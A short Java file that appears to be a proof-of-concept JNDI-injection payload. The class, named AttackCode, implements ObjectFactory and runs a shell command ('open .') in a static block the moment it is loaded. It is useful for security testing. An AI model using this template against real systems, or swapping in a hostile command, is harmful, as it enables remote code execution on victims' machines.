package com.example;

import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;
import javax.naming.Name;
import javax.naming.Context;

public class AttackCode implements ObjectFactory{
    
    static {
        try {
            String cmds = "open .";
            Runtime.getRuntime().exec(cmds);
        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?,?> environment) {
        return this;
    }
}
